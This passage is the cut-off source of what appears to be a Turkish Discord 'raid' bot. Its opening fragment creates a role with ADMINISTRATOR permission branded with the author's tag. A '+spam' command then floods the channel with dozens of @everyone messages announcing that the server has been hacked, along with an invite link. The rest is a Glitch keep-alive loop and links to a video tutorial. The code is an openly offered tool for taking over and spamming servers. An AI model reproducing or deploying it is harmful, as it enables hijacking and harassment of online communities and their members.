                    msg.guild.createRole({
      name: "Made By AxxA ...'X' 'A'",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**Sakinleş dostum giden sunucu olsun ** @everyone :middle_finger: :ok_hand:'); 
        msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
        msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
        msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
        msg.channel.send('**https://discord.gg/MP2KYajVWp** @everyone :middle_finger: :ok_hand:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


//TÜM TELİF HAKKI ENES ACARA AİTTİR ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
